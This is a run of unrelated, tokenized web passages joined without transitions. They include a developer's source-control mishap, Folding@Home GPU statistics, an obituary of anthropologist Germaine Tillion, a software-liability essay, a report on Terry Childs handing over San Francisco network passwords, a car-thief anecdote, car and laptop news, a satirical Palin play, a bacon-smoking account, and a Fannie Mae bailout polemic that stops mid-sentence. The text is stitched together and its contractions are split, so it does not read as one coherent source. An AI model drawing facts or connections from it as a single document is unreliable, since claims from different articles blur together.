Merv could n't do anything but sit there and take it — he thought that he had screwed something up , and should have been more careful with the source control .
After Joe ran out of steam and retreated to his lair on the developers ' floor , Merv was still in shock .
His first foray into real software development could n't have gone worse .
Merv 's subconscious picked up where Joe 's tirade left off .
I 'm way out of my league .
This was a complete disaster .
There 's no way I can spin this or apologize for it .
Everything he said was true —
I 'm such a f$#king idiot .
Merv wanted to crawl into a hole and die .
He was ready to run out the door and never look back .
Taking stock of the situation , Merv realized that when he'd checked out the file to the dev environment , he must have overwritten Joe 's changes .
But how could that be possible ?
Merv pondered .
Is n't that exactly what source control is supposed to prevent ?
Ready to own up to it , he dragged himself to the developer floor to talk to his boss .
Merv gave his side of the story , explained how he did n't realize he'd done anything wrong , and that he understood if the company would demand he commit seppuku .
Merv 's boss listened in silence , finally smirking , then laughing .
" You 're right , Merv .
Using source control should prevent you from overwriting his changes .
But Joe does n't like using source control — he keeps saying it 's easier just to edit the files on the server .
I told him he has to stop doing that , but ... " he shrugged .
" Anyway , thanks for teaching him a lesson — do n't worry too much about it . "
Merv was reassured , but still somehow not up to going to Joe 's desk to return the tirade .
Santa Clara ( CA ) - Nvidia GPUs have become the leading processing platform within Folding@Home and continue to grow quickly : GeForce Processors are likely to become the first technology to break the 1.5 PFlops barrier .
Nvidia GPUs currently represent 42 % of the total processing power of Folding@Home - or 1428 TFlops of a total of 3372 TFlops .
While it appears that Nvidia can increase its overall share in this environment only slowly , it has become the leading technology and is now close to be hitting 1.5 PFlops of overall performance .
The current performance is achieved with 12,982 processing units , according to the statistics released by Folding@Home .
The second most powerful platform is Sony ’s PS3 with 1251 TFlops ( 44,379 processors ) , followed by ATI Radeon graphics cards with 404 TFlops ( 3677 processors ) .
At least in comparison with ATI / AMD , Nvidia ’s advantage is currently based solely on the sheer number of GPUs on the network .
Broken down to each unit , both Nvidia and ATI processors deliver 110 GFlops on average .
PS3s are measured at 28 GFlops , while Windows CPUs , which represent the majority in absolute numbers on the network ( 211,978 active units ) , provide about 9 GFlops each .
" Applications like Folding@Home are just the beginning , every day we are seeing more and more examples of computing problems that are benefitting from CUDA and our GPU technologies , " said Michael Steele , general manager of visual consumer solutions at Nvidia , in a prepared statement .
Germaine Tillion , a major figure in contemporary French thought who used experiences studying peasants on the edge of the Sahara , fighting Nazis and surviving a concentration camp as compelling intellectual fodder , died on Saturday at her home in St. - Mande , France .
She was 100 .
Her death was announced by the Web site of her association .
Ms. Tillion , an anthropologist , lived through moments of high drama , including being arrested by the Gestapo on Aug. 13 , 1942 , for her role in the formation of the French Resistance .
The charges against her included five that could have led to the death penalty .
At Ravensbrück , a concentration camp for women in eastern Germany where she spent three years , she learned that she had been designated to disappear without a trace , with the label NN , under Hitler ’s Nacht und Nebel ( night and fog ) decree on the fate of Resistance workers .
She survived , but her mother , who was picked up for hiding a British airman , died in a gas chamber at Ravensbrück in 1945 .
She was selected for death for having white hair .
After the war , Ms. Tillion was drawn into the biggest controversy in France in the 1950s , the Algerian demand for independence from France and the French opposition .
In the summer of 1957 , Saadi Yacef , a leader of the Algerian forces , asked to meet with her .
After two and a half hours of conversation , Mr. Yacef said , “ You see that we are neither criminals nor murderers . ”
Software Liabilities and Free Software
Whenever I write about software liabilities , many people ask about free and open source software .
If people who write free software , like Password Safe , are forced to assume liabilities , they will simply not be able to and free software would disappear .
Do n’t worry , they wo n’t be .
The key to understanding this is that this sort of contractual liability is part of a contract , and with free software — or free anything — there ’s no contract .
Free software would n’t fall under a liability regime because the writer and the user have no business relationship ; they are not seller and buyer .
I would hope the courts would realize this without any prompting , but we could always pass a Good Samaritan - like law that would protect people who distribute free software .
( The opposite would be an Attractive Nuisance - like law — that would be bad . )
There would be an industry of companies who provide liabilities for free software .
If Red Hat , for example , sold free Linux , they would have to provide some liability protection .
Yes , this would mean that they would charge more for Linux ; that extra would go to the insurance premiums .
That same sort of insurance protection would be available to companies who use other free software packages .
The insurance industry is key to making this work .
Luckily , they ’re good at protecting people against liabilities .
There ’s no reason to think they wo n’t be able to do it here .
I ’ve written more about liabilities and the insurance industry here .

The San Francisco computer engineer accused of withholding access codes to the city 's network surrendered the password during an unusual jailhouse visit by Mayor Gavin Newsom , authorities said Tuesday .
Newsom came away with the access codes Monday night after talking with Terry Childs , 43 , of Pittsburg , who has been held since July 13 on four felony counts stemming from what prosecutors describe as an effort to block administrative access to the network that handles 60 percent of the city 's information , including sensitive law enforcement , payroll and jail booking records .
Childs had given officials what turned out to be bogus passwords and then had refused to give the correct ones , even when threatened with arrest , authorities say .
But Monday , Childs ' defense attorney Erin Crane contacted the mayor 's office , setting in motion the secret visit .
The visit was so secret that the mayor did not tell District Attorney Kamala Harris ' office or police about it .
Newsom decided on his own to accept Crane 's invitation , mayoral spokesman Nathan Ballard said .
Harris ' office had no immediate comment .
Police declined to answer questions , citing a continuing investigation into Childs ' actions on the job at the city Technology Department .
Newsom " figured it was worth a shot , because although Childs is not a Boy Scout , he 's not Al Capone either , " Ballard said .
Last week , Newsom described Childs , who has worked for the Technology Department for five years , as someone who had been well - liked and was " very good at what he did , " but who had lately become " a bit maniacal . "
Ron Vinson , the chief administrative officer for the Technology Department , said Newsom had n't told him about the jail visit in advance .
" But we are glad he was successful in getting the codes , since no one else has been able to , " he said , adding that officials expected to have full control of the computer network soon and to generate new passwords for administrators .
Ballard said he had accompanied Newsom to meet with Childs at 1:30 p.m. Monday for about 15 minutes .
They met in a visiting room in the Hall of Justice jail .
" He gave the mayor the codes , and then we went over to ( the Technology Department ) " and gave the codes to computer engineers , Ballard said .
" And when we got back to City Hall , we were each separately questioned by the ( police ) inspector , because we are now witnesses in the case . "
Ballard said he had called Police Chief Heather Fong to alert her to what happened after the mayor returned to City Hall .
But there was a snag , Ballard said - the code that Childs supplied to Newsom did n't function immediately .
Newsom had to call back the attorney , who provided more information , and the system started working , officials say .
Crane is likely to cite Childs ' cooperation during a court hearing today in which she will ask a judge to lower his $ 5 million bail .
In her motion to reduce bail , Crane said Childs had been the victim of a " bad faith " effort to force him out of his post by incompetent city officials whose meddling was jeopardizing the network Childs had built .
At one point , she said , Childs discovered that the network was at risk of being infected with a computer virus introduced by a colleague .
" Mr. Childs had good reason to be protective of the password , " Crane said .
" His co-workers and supervisors had in the past maliciously damaged the system themselves , hindered his ability to maintain it ... and shown complete indifference to maintaining it themselves .
" He was the only person in that department capable of running that system , " Crane said .
" There have been no established policies in place to even dictate who would be the appropriate person to hand over the password to . "
The defense attorney added that " to the extent that Mr. Childs refused to turn over the password ... this was not a danger to the public . "
Crane said Childs was not a flight risk , although he had made some " poor choices 24 years ago " when records show he was convicted in Kansas of aggravated robbery .
" He served time for those mistakes and changed his life , " got an education and rose " to the top of his field , " she said .
Referring to the felony computer - tampering counts , Crane said , " Mr. Childs intends to not only disprove those charges , but also expose the utter mismanagement , negligence and corruption at ( the Technology Department ) which , if left unchecked , will in fact place the city of San Francisco in danger . "
Proving there 's no honor among thieves , a lowly car thief in Salinas , California was sitting outside a convenience store in his stolen SIlverado pickup when a more violent and armed criminal jumped in the passenger seat and demanded the thief drive the truck away .
The carjacker and the car thief hit a bit of a snag when their twice - stolen Chevy ran out of gas .
The carjacker then ordered the thief to get out and push , but that untrustworthy thief merely ran away ... and called police to report the carjacking of his stolen truck .

Police eventually caught up with the Silverado ( we 're assuming he did n't imagine the other guy would call the cops ) and the carjacker led them on a short chase that ended in a wreck .
Said local police , " you could n't make up something stranger than this . "
Actually , in our version Shia LaBeouf is driving .

Nissan ( NSANY ) is making a tremendous effort to come out on top in the " green " car wars .
The Japanese carmaker 's electric car , scheduled for a 2010 release , figures to be the first mass - market , zero-emission vehicle in the US .
But Nissan 's innovation does n't end there .
The company now has an " eco- pedal " that will force drivers to save gas :
Nissan 's " ECO Pedal " system _ promoted as being both green and safe _ makes the gas pedal press upward when it senses motorists are speeding up too quickly .
... the system , which will be available next year , can help drivers improve fuel efficiency 5 to 10 percent .
Of course , drivers can opt to switch the system off .
Which most people probably would .
However , conservation is n't easy , and it's a noble try by Nissan nonetheless .

If you ’re an Apple fan , then you might remember how much of a fail the allegedly “ revamped ” MacBook Pro launch was last year .
While the company promised to deliver a new and improved product to its fans across the globe , the interest for the product quickly fizzled over due to the meager possibilities and less - than - mediocre specs the device came with .
However , Apple are possibly going to fix it all this year with the upcoming MacBook Pro 2017 .
What Will the New MacBook Pro Bring ?
First and foremost , the new MacBook Pro 2017 will potentially come in a gold variant as well , which comes as great news for us gold lovers out there .
Now you can match your gold iPhone to your MacBook , yay !
But the improvements do n’t stop here .
Apple seems to be trying their best to recover from last year ’s fiasco and will reportedly equip the new device with far more advanced technology .
Thus , the new MacBook Pro 2017 will have a state - of - the - art system that will enable it to create content that comes close to Cintiq ’s Wacom pen display .
It ’s no secret that professionals worldwide love Cintiq pens and touch screens .
Now Apple promises that in 2017 its users will be able to connect the iPad Pro to their MacBook Pro and use it as a Cintiq device .
Pretty cool , huh ?
This comes as great news especially if you already own an iPad Pro , or were planning to buy one .
In this way , both devices will be put to good use , and you will be more productive than ever .
All in all , the upcoming MacBook Pro 2017 sounds pretty great .
Let ’s just hope that Apple will hold true to their promises and amaze us with its launch .
If they do , 2017 will be the year of the Apple for sure .

Characters :
Mom & Dad – Well - meaning , but indulgent .
Unsure of how this whole family dynamic works .
They appear weary and run down .
Child – Cute as a button .
Feisty , bold and confident .
Friend – ( if actors are hard to come by , this part can be played by a bobble - head doll , and his one line can be cut )
( Curtain rises .
We see an average American kitchen .
Mom and Dad are standing in front of a child whose arms are folded indignantly .
A large jar lies on its side , with the lid removed .
Half a cookie sits on the counter . )
M&D – Child , we ’ve got a problem here .
Someone ’s been stealing cookies from the cookie jar .
We ’ve done some checking , and due to the crumb trail leading to your room , the fact that nobody else was around , and the chocolate in the corners of your mouth , we ’ve come to the studied conclusion that it was you .
You know you were n’t supposed to be doing this .
We have n’t decided what the consequences are going to be , but we are in complete agreement , and do believe you are the one who took the cookies .
Do you have something to say ?
Child – I do have something to say to you , but you ’re going to have to wait a minute .
( wipes chocolate from corners of mouth and clears throat ) I ’ll be right back .
( brightly ) I ’ve done nothing wrong and I can prove it !
( Child runs out the door .
Time passes and child returns with a friend . )
Child – ( out of breath ) I have decided to ask my friend to investigate this , and he has come to the conclusion that I did nothing wrong .
So , I really think we need to move along here .
I hope you feel better now , Mom and Dad. ( smiles )
Friend – ( nodding )
She has done nothing wrong .
M&D – ( tentatively , to friend ) But …. what about all the evidence ?
Did you see the crumb trail ?
It ’s not like we did n’t check this out ourselves .
And she said she was going to prove she did n’t do it !
Child –
So , you ’re saying you do n’t trust me ?
( silence )
What .
Do you want to see what ’s in my pockets ?
Is THAT what you ’re saying ?
Because there are no cookies in there and I ’ll show you to prove it .
Do you want to know every single thing I told my friend to prove it ?
Is that what you want ?
That ’s what you want , ISN ’T IT ?!
M&D – ( looking at the floor ) Yes .
We would like to see that .
You promised you ’d show us , so go ahead and empty the pockets , and tell us what you said to your friend .
Child –
This is rediculous .
I ca n’t believe you wo n’t let this drop !
You really do n’t trust me ….
I ca n’t believe it .
I mean I had my friend check this all out !
You are just being unfair !
Why do you hate me ?!? ( pause )
You know what ?
Forget it .
I ’m NOT showing you what ’s in my pocket because you are just being ridiculous !
Dad , I know you ’d agree with me if it was n’t for Mom butting in !
She just wants to ruin my life !
We ’ll I ’m moving on .
There are more important things going on in this house , like homework , and chores , and dinner !

Now , I bring your attention to today ’s headline in the Anchorage Daily News :
Governor ’s Office : Troopergate is Over and Palin Testimony Wo n’t Be Released to the Public
As far as Gov. Sarah Palin is concerned , Troopergate is behind her and she wo n’t provide a transcript of testimony she gave in an investigation into whether she violated ethics laws in firing her public safety commissioner , Walt Monegan . [ snip ]
“ The people of Alaska — and of the nation — deserve to have a decision from the proper tribunal putting their minds at ease that suggestions of misconduct that have circulated on the Internet and in some media outlets are not true .
I therefore am waiving the confidentiality that usually covers personnel board complaints , ” Palin said in a statement released by her lawyer , Thomas Van Flein , on Sept. 2 , just days after she was named John McCain ’s running mate .
She gave her only testimony in the matter on Oct. 24 while on the vice presidential campaign trail .
Van Flein said at the time that she wanted to release a transcript of her deposition .
Reached Thursday evening , Van Flein said he had n’t talked to Palin about releasing it since then .
“ That ’s their call , I guess , ” he said .
Palin is simply ready to move on , her deputy press secretary , Sharon Leighow , wrote in an e-mail exchange this week .
“ This matter is closed .
We see no public purpose in artificially prolonging this controversy . ”
Sarah ( child ) who promised to release her sworn testimony ( empty her pockets ) which was given to Timothy Petumenos ( friend ) , who performed the investigation of Sarah Palin , which she initiated herself , is now stomping out of the room .
Meanwhile , Mom & Dad ( the Legislature ) have been told that their work is meaningless , that they are impotent , that they are laughable .
The kid just told Mom and Dad that they have no power .
And unless we do something about it , Mom and Dad are about to say , “ OK , Sweetie .
You just go clean your room and we ’ll forget all about it .
I ’m sorry if we upset you . ”
These are the kinds of parents that raise spoiled children with a sense of entitlement , who do whatever they want until someone stops them .
I do n’t want that kid running my state .
This entire situation , of course , is dripping with irony , as GovernorPalin just returned from a trip stumping for Saxby Chambliss on the premise that if Democrats managed to get a 60 - seat majority in the Senate , it would be a disaster because “ we would have no checks and balances ” .
And she would n’t want HER kids growing up in a country like THAT .
Indeed .
Well , Alaska Legislature , I do n’t want my children growing up in a country with no checks and balances either .
Of course the Palin administration sees no purpose in finishing this process .
Because the truth will hurt .
Her testimony will open a big can of worms that we can all look at , and pick through , and figure out what she might have said that contradicts the truth .
There ’s a word for that ……oh , yes !
“ Perjury . ”
Last time I checked , perjury was a crime .
So , if she really really did nothing wrong , then why wo n’t she empty her pockets ?
How to smoke pork belly at home .
2nd Jul 2008 Nick Kindelsperger
First , I needed to find some pork belly with its skin still firmly on .
My previous attempt removed it , along with a lot of precious fat directly underneath .
My bacon did n't have nearly enough fat on it to fry up , so instead cooking up beautifully in a pan , it burned .
My local butcher would n't sell me a piece with the skin on unless I bought 10 pounds , a fact I still find ridiculous .
A commenter pointed out that Asian Markets tend to sell pork belly with the skin still on .
The only Asian market I could find was 161 in Northern Columbus , which sat across the street from a Whole Foods , which for some insane reason can't even sell pork belly .
The Asian market had it , though not in as big a pieces as I would have liked .
But no matter , I just decided to buy two smaller hunks equaling about 3 pounds and got to business .
Second , I needed pink salt .
Blake talked highly about it , but I hesitated .
I could n't find it at any specialty store in Columbus , including those that made their own sausages .
So I bit the bullet and ordered a large bag , which Blake assured me would " last for a long , long time " .
He 's right .
The pink salt ( which is actually pink in color ) is only used a teaspoon or so at a time .
Its traditional use was to help prevent botulism , but in this day and age of refrigeration its biggest draw is that it lends the meat a rosy hue and an unmistakable cured taste .
My bacon would look right .
Third , I needed a more appropriate cure .
My previous attempt was too savory .
Like I mentioned earlier , I wanted bacon that tasted like good American bacon with loads of maple syrup .
I found this cure in Michael Ruhlman 's Charcuterie .
The cure :
2 ounces kosher salt
2 teaspoons pink salt
1/4 cup brown sugar
1/4 cup maple syrup
I mixed the cure together , and then rubbed the cure all over the pieces of pork belly .
I then placed them in a tightly fitting plastic bag .
Ruhlman said the cure would release some water in the pork creating a brine , so it was important that things were nice and snug .
I cured the meat for 7 days , turning it over every other day .
On the seventh day , I removed the pork bellies , washed them off , and dried them for a day on a metal rack in the fridge .
Forth , I would need to smoke my bacon .
Smoke , as I 've come to learn from Mike Mills , is all about flavor .
From the same company that I got the pink salt I ordered some hickory sawdust .
All I needed was a grill .
And without really consulting my sister , I decided to spend a whole day using her grill to make bacon .
I hoped she would n't care .
The cooking process has two components .
The heat , which needed to hover around 200 degrees for about 3 hours , would be supplied by the gas grill .
I found that if I turned one of the three burners on low and closed the lid I 'd get just about 200 degrees .
I regulated it by opening the hood if the temperature got too high .
The flavor would come from the hickory sawdust , which I had prepped by soaking in water for 30 minutes .
All I would need to do now was get the chips smoking by heating them .
Easier said than done .
It was n't until I opened up my sister 's gas grill that I realized I could just toss the wood on top of the flame like I had on a charcoal grill .
I 'd have to contain the sawdust somewhere .
After some quick online consultation , I realized I could sprinkle some sawdust in a metal pan , cover it with foil , and then poke some holes in top to let the smoke pour out .
I set the tray over the burner .
I knew it would take some time , but after nearly 30 minutes without any smoke I started to panic .
My bacon was cooking this whole time and had n't gotten any good smoke flavor .
So I did what any normal person would do and went to the corner store and bought some charcoal .
I doused the briquettes in lighter fluid , lit them out by the driveway , and once properly ashed over , I tossed them in the metal pan with the hickory sawdust and set that try in the gas grill .
I expected instantaneous combustion and for glorious smoke to instantly pour out .
But nothing .
I doused it in more lighter fluid , tossed in a couple matches , and waited .
Still no smoke .
What could I possibly do ?
Without the smoke I could have done this in the oven .
The low heat source was n't providing much flavor , and a low oven would have done just as well .
I went back upstairs and looked at the techniques to get the sawdust smoking .
Nearly every said to do it the way I had first attempted .
I figured maybe I was n't giving it enough heat .
So I dumped out the charcoal on the car patio , put new sawdust in the pan , covered it with aluminum foil , poked some holes , removed the metal grate , and set the tray right on top of the burner .
But this time over high heat .
Sure enough , after about 15 minutes the smoke came .
The smoke lasted for about 30 minutes .
To keep a constant flow of smoke , I had one tray over the high heat smoking away and then another tray beside it .
That other tray would n't begin to smoke until it was over high , but it seemed to have a leg up on a cold tray , which would have taken at least 15 minutes to start smoking .
It took about 3 hours to get the bacon up to an internal temperature of 150 degrees .
Then I removed it from the grill and let it cool for 30 minutes or so .
Though the skin helped make great bacon , it did need to be removed .
I took a long knife and slowly sliced as closely between the fat and skin as I could .
I wanted as much of the fat to stay as possible .
It certainly looked good - do n't you just wanted to take a big bite of that ?- but not much like the bacon I had wanted .
But once I sliced in , I realized that only the outside had the cooked appearance .
The inside looked exactly like regular bacon .
It was a lot harder to slice off uniform pieces of bacon than I had imagined .
But I finally did get a few pieces that , while small , did look like bacon .
Ah bacon ...
It took awhile , but like I mentioned earlier , it 's unbelievably satisfying work .
And since it looks like regular bacon , I 've been able to share this experience with other people .
I mean , who is going to turn down bacon ?
But this bacon is different than the store bought kind .
The cure is vivid and clean , and the overall flavor is more pronounced .
Certainly not the easiest thing I 've done , but I think completely worth it .
Fed Asks for Blank Check for Fannie and Freddie in Flawed Rescue Plan
The Fed 's emergency rescue plan for the financial markets is hopelessly flawed .
It 's a scattershot approach that does n't address the real source of the problem ; an unregulated , unsustainable structured finance system that emerged in full - force after 2000 and spawned a shadow banking system that creates trillions of dollars of credit without sufficient capital reserves .
This is the heart of the problem and it needs to be debated openly .
The present system does n't work ; it 's as simple as that .
It makes no sense to provide trillions of dollars of taxpayer money to shore up a system that is essentially dysfunctional .
It 's just throwing money down a rat - hole .
The Federal Reserve and US Treasury want a blank check to prop up Fannie Mae and Freddie Mac , the two war - horses of the mortgage industry , that currently underwrite nearly 80 per cent of all new mortgages in the US .
But by any objective standard both of these GSEs are already insolvent .
Thus , the taxpayer is being asked to rescue a failed industry that has been used for private gain so that speculators will not have to suffer the losses .
Even worse , Fannie and Freddie have written hundreds of billions of dollars worth of mortgages that have not yet defaulted , but will certainly default within the next two years .
This is bound to batter the already faltering economy .
The bad paper held by Fannie and Freddie are mortgages that were made to unqualified applicants who are presently losing their homes in record numbers .
Their loans were approved because there was no functioning regulatory body to oversee their issuance and because the mortgages were transformed into complex securities that were sold to credulous investors around the world .
The ratings were fixed to meet the requirements of their employers , the investment banks , which marketed these exotic bonds to foreign banks , insurance companies and hedge funds .
That puts Fannie and Freddie at the center of a system that needs radical surgery to eradicate the bad paper .
If this does n't happen in a timely fashion , then foreign investors will stop purchasing US debt and the dollar will crash .
By creating a backstop for Fannie and Freddie , the Fed is linking US sovereign debt with mortgages and derivatives that are already known to be fraudulent .
This is a big mistake .
According to Merrill Lynch , the US is already facing a long - term " financing crisis " as the weakening US economy and sluggish consumer spending could signal an end to the $ 700 billion in foreign investment that covers America 's current account deficit .
By assuming the GSE 's enormous debts , the Bush administration is just speeding this process along and inviting disaster .
Treasury Secretary Henry Paulson has been intentionally oblique about the implications of the proposed bailout .
On Tuesday , he delivered a statement in front of the massive stone columns of the Department of the Treasury , a towering monolith that arouses feelings of confidence in rock - solid institutions .
He made it clear that Fannie Mae and Freddie Mac would have the " explicit " backing of the US government :
" First , as a liquidity backstop , the plan includes a temporary increase in the line of credit the GSEs have with Treasury .
Treasury would determine the terms and conditions for accessing the line of credit and the amount to be drawn .
Second , to ensure the GSEs have access to sufficient capital to continue to serve their mission , the plan includes temporary authority for Treasury to purchase equity in either of the two GSEs if needed .
Third , to protect the financial system from systemic risk going forward , the plan strengthens the GSE regulatory reform legislation currently moving through Congress by giving the Federal Reserve a consultative role in the new GSE regulator 's process for setting capital requirements and other prudential standards . "
It was an impressive performance from a public relations point of view , but it did n't fool anyone on Wall Street .
What Wall Street wants is details not blather .
Paulson gave no specifics about how much money the government would provide or what the nature of the new relationship would be ; conservatorship , recievorship , nationalization ?
What is it ?
The truth is that Paulson was deliberately vague because he and friend Bernanke would like to have it both ways ; they 'd like to provide a liquidity backstop and an endless line of credit for the two GSE 's without formally nationalizing them .
That would avoid the further dilution of stock values while keeping the US government from taking another $ 5 trillion of mortgage debt onto their balance sheet .
It is a delicate balancing act , but Paulson seems to think he carried it off .
He 's wrong , though , and volatility in the stock market proves it .
Investors are clearly skittish about the new arrangement .
They want to know the facts about the government 's commitment .
Paulson is discovering that deceiving investors is not as easy as duping the public about fictional WMD or Niger uranium .
Sometimes even the dullest person can grasp the most complex matters when it comes to his own money .
Fannie and Freddie have been insolvent for ages , but it has n't stopped lawmakers from pushing the envelope and loading more debt on their balance sheets .
Here 's how Barron 's summed it up more than six months ago :
" Fannie 's balance sheet is larded with soft assets and understated liabilities that would leave the company ill - equipped to weather a serious financial crisis .
And spiraling mortgage defaults and falling home prices could bring a tsunami of credit losses over the next two years that will severely test Fannie 's solvency .
But , if the truth be known , a considerable portion of Fannie 's losses also came from speculative forays into higher - yielding but riskier mortgage products like subprime , Alt - A ( a category between subprime and prime in credit quality ) and dicey mortgages requiring monthly payments of interest only or less .
For example , Fannie 's $ 314 billion of Alt - A -- often called liar loans because borrowers provide little documentation -- accounted for 31.4 % of the company 's credit losses while making up just 11.9 % of its $ 2.5 trillion single - family - home credit book .
Fannie was clearly looking for love -- and market share -- in some of the wrong places . "
Rampant speculation , risky investments , and Enron - type accounting ; hardly the stuff of solid portfolios .
That 's why the two mortgage giants are stumbling headlong towards oblivion despite the Treasury 's panicky relief operation .
By last Friday Fannie 's stock had fallen 47 per cent while Freddie was down 50 per cent .
The public may still be in the dark about what is going on , but investors have a pretty good grip on the situation ; they can see the great birds are already circling overhead and its just a matter of time before they descend on their prey .
Paulson 's attempts to muddy the water have amounted to nothing .
The fact remains that the two biggest mortgage - lenders in the world are busted and last week 's stock sell - off was tantamount to a run on the country 's largest bank .
Paulson 's statement was really nothing more than a eulogy for the mortgage industry ; a few heartfelt words over the rigid corpse of a close friend .
When the housing market started to tumble and Wall Street 's " securitization " model froze - up , Fannie had to take the lion 's share of the mortgages to keep the real estate market hobbling along .
In a two year period , between the housing peak in 2005 and 2007 , Fannie went from roughly 40 per cent of the market to about 80 per cent .
The Congress even enlarged the size of the mortgages they could underwrite from $ 417,000 to over $ 700,000 .
The prospect of bankruptcy never diminished congress 's generosity .
Fannie and Freddie currently own or underwrite roughly half of the nation 's $ 12 trillion mortgage market .
Basically , every home mortgage lender depends on them for financing .
Their shares are owned by individual investors and banks around the world .
Foreign investors have always believed that the GSE bonds were as risk - free as US government Treasuries .
Now they are beginning to wonder .
( Foreign central banks , led by China and Russia , hold at least $ 925 billion in U.S. agency debt , including bonds sold by Freddie and Fannie , according to official U.S. statistics )
Whatever happens to Fannie , the loss of investor confidence will send long term interest higher as investors demand bigger returns for the risk they 're taking on GSE bonds .
That 'll put a straitjacket on home sales which are already flagging from soaring inventory and falling prices .
Higher rates could bring the whole housing market to a standstill .
The Fed 's cheap credit policy under Greenspan created an artificial demand for housing which ballooned into the biggest equity bubble in history .
Low interest rates are a subsidy which naturally lead to speculation and asset - inflation .
At a certain point , however , the endless debt - pyramiding reaches its apex and the whole mechanism switches into reverse .
Now the economy has entered deleveraging - hell where everything is primal blackness and the gnashing of teeth , the flip - side of speculative rapture .
By some estimates , Freddie Mac has a negative net - worth of $ 17 billion .
It 's basically insolvent , although Paulson would like to see the charade go on a while longer .
Investors purchased another $ 3 billion of the two GSEs last Monday , but the appetite for failing bonds is diminishing ?
What 's certain is that the collapse of Fannie and Freddie would be a watershed event and a mortal blow to the US financial system .
$ 5 trillion in shaky mortgage - debt can't be easily swept under the rug and ignored .
Interest rates on everything would quickly rise ; credit would become scarcer , economic growth would shrivel , unemployment would soar , and the dollar will plummet .
As the two mortgage giants continue to get whipsawed by higher priced capital and waning investment , US government debt will likely to lose its much - vaunted triple A credit rating .
On Friday , credit default swaps on government debt doubled , a sign that investors are losing confidence that the US will be able to manage its twin deficits or pay off its debts .
It 's the end of the road for Washington 's free lunch throng and for a paper dollar that is n't backed by much of anything except music videos , fast food and smart - bombs .
PAULSON'S POWER GRAB
What Paulson is really wants is for congress to allow the Fed to regulate the financial system without congressional oversight .
Paulson 's so - called blueprint for financial regulation is a blatant power - grab meant to expand the authority of the banking oligarchy giving them unlimited power over the markets .
Journalist Barry Grey sums it up like this in his article on " US Bailout of Mortgage Giants : The politics of plutocracy " :
" The plan outlined by Treasury Secretary Henry Paulson would give him virtually unlimited and unilateral authority to pump tens of billions of dollars of public funds into the mortgage finance companies .
At the same time , the Federal Reserve Board announced that it would allow the companies to directly borrow Fed funds ...
The Democrats ... now march in lockstep with the minority party to rush through laws demanded by Wall Street ...
The buying of legislators and their votes by corporate interests is carried out openly and shamelessly .
Members of Frank 's House Financial Services Committee received over $ 18 million from financial services , insurance and real estate firms this year .
Frank himself raised over $ 1.2 million , almost half of which came from finance and related industries ... Senator Dodd 's top contributor in the 2003 -2008 election cycle was Citigroup , followed by SAC Capital Partners .
He raised $ 4.25 million from securities and investment firms .
Senator Schumer 's top contributor was likewise Citigroup .
He raised $ 1.4 million from securities and investment firms , his most lucrative corporate sector . "
The smell of political corruption is overpowering , and yet , the plan is moving forward regardless .
Even if Paulson 's plan worked in the short term , the damage would be enormous .
It would place the country 's regulatory powers and purse - strings in the hands of the same amoral banksters who created this mess to begin with .
It is the fast - track to corporate feudalism on a nationwide scale .
PITFALLS FOR THE GSEs
The biggest problem facing Fannie and Freddie is that wary investors will not roll over the debt of the two companies which will precipitate a collapse .
This is where it pays to have people who can be trusted in positions of power .
Henry Paulson is the worst thing that ever happened to the US Treasury .
Paulson is to finance capitalism what Rumsfeld is to military strategy .
To say that Paulson is lacking in credibility is an understatement .
Nothing he says can be taken at face - value .
When Paulson says " the worst is behind us " or the " subprime crisis is contained " or the Bush administration " supports a strong dollar policy " ; most people know it is a fabrication .
Besides , Paulson is completely out of his depth in the present crisis .
His appearances on TV , with the beads of sweat glistening on his forehead , and his foolish repetition of the same stale mantra is eroding confidence in the financial system and sending waves of panic rippling through Wall Street .
Enough is enough .
He needs to go .
If the administration was serious about changing direction they would dump Paulson and reinstate Paul Volcker .
Whatever one thinks about Volcker , his presence would calm the markets and send a message that the adults were back in charge .
But that wo n't happen .
The Bush team still thinks they can finesse their way through the thicket of investor skepticism .
That means that catastrophe is inevitable as more and more investors pick up their bets and head for the exits .
TIME IS RUNNING OUT
Whatever the administration decides to do ; time is short and they have one chance to get it right .
The Treasury needs to find a way to ring - fence the garbage bonds and pray that the investing public wo n't dump their holdings in a panic run on the market .
Either way , it 's a gamble and there 's no guarantee of success .
The Wall Street Journal outlined the doomsday scenario if Paulson 's plan fails :
" Falling house prices and nonpaying homeowners cause the value of the trillions of dollars in outstanding debt held by these government - sponsored enterprises ( Fannie and Freddie ) to plunge .
Many banks have balance sheets stuffed full of this paper .
They face huge losses , which some can't survive .
They and other investors , such as foreign central banks , then dump the GSE paper .
Fannie and Freddie would end up unable to lend , or at least to take up anything like their current 80 % share of the U.S. mortgage market , further punishing the reeling housing market .
This would add another twist to the spiral of falling prices , credit losses and failing lenders .
What should they do ?
First , devise a plan -- and fast .
There is no time to dither . "
( Wall Street Journal )
If foreign banks and investors ditch their GSE debt ; it will send shockwaves through the global economy .
But if the Treasury provides unlimited funding for a sinking operation , it 's likely to trigger a sell - off of the dollar .
It 's a lose - lose situation .
For now , bond holders are sitting - tight even though the stock is tanking , but for how long ?
They 've already been taken to the cleaners on hundreds of billions of dollars of mortgage - backed garbage ; now there are rumors that the US government wo n't back agency debt .
What kind of shabby shell - game is the US playing anyway ?
New York Times :
“ If people lose faith in Fannie and Freddie , then the whole system freezes up , and nobody can buy a house , and the entire housing market can crash , ” said Paul Miller of the Friedman , Billings , Ramsey Group in Arlington , Va .
“ There 's a fine line between having faith and losing it , and sometimes it 's unclear when it has disappeared .
But when investors cross that line , bad things happen very quickly . ”
And it affects more than the housing market , too .
The bond and equities markets are handcuffed to real estate and they 're already listing from the slowdown in investment .
The Fed thought they could keep the whole mess from going sideways by opening up " auction facilities " where the banks could get low interest capital in exchange for their mortgage - backed junk .
But the banks have curtailed their lending and there 's bigger trouble ahead .
Bridgewater Associates issued a warning last week that losses to the banking system would exceed $ 1.6 trillion , four times original estimates and enough to crash the entire banking system .
So far , banks have only written down $ 450 billion , which means that they are only 25 per cent of the way through the current credit storm .
Defaults are liable to skyrocket as hundreds of undercapitalized banks turn to a grossly underfunded FDIC ( $ 52 billion in reserves ) to cover the losses of their depositors .
The prospect of a humongous taxpayer bailout seems nearly unavoidable .
What 's most disturbing is that nothing has been done to restore the markets to a functional model .
The Fed 's strategy is still to try to keep the relatively new " structured finance " model ( with all it 's bizarre - named debt instruments and derivatives ) in place even though it failed its first stress - test and has demonstrated that it cannot withstand even moderate downward movement in the market .
The current model is kaput ; there needs to be a Plan B or the Fed is just wasting its time .
Fannie 's demise comes at a particularly difficult time for the banking system .
According to a report by Paul Kasriel , Chief Economist at Northern Trust :
